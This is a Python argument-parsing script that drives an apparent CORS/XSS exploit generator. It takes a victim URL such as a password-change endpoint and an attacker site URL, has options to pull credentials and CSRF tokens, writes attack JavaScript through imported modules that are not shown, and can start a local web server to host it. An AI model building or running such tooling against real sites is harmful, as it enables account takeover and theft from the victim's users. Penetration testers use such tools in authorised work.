import argparse
import os
from createfiles import createfiles
from writejs import writejs

parser = argparse.ArgumentParser()

parser.add_argument("-s", "--site",default="http://localhost:1234/cors.html", help="Enter Your URL, EXAMPLE: https://burcollab/. Default is : http://localhost:1234/cors.html")
parser.add_argument("-v", "--victim", help="Enter Victim's Full URL, EXAMPLE: https://api.victimsite/changepassword/.",required=True)
parser.add_argument('-m', '--method', default='GET',help='Enter The Desired Method: GET/POST.')
parser.add_argument('-c', '--content', default='application/json',help='Enter The Desired Content Type. Default: application/json')
parser.add_argument('-a', '--auth', default='a',help='Disable Credentials Pulling: Y')
parser.add_argument('-cs','--csrf',default='n',help='''Enable CSRF Token Pulling: Y | 
                    The token is saved as the variable "csrf" in the js please enter the variable into the correct place''')


if __name__ == "__main__":
    args = parser.parse_args()
    # Creates The Files Needed
    cf = createfiles(args)
    arg = cf.arg
    # Write The XSS/CORS Code in JS
    writejs(args,arg)
    # Optional Server Opening
    if input("Do You Want To Open A Python Server ? : Y/N ").lower() == 'y': 
        create = os.system("python -m http.server --directory ./CORS_Javascript 1234")